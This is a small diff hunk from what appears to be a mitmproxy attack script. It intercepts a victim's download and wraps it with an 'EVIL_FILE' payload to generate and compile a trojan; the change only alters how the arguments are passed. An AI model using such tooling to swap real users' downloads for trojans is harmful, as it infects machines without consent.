@@ -24,7 +24,7 @@ def request(flow):
 
 		print("[+] Generating a trojan for " + flow.request.pretty_url)
 
-		trojan = Trojan(front_file, EVIL_FILE, None, trojan_file)
+		trojan = Trojan([front_file], [EVIL_FILE], None, trojan_file)
 		trojan.create()
 		trojan.compile()
 
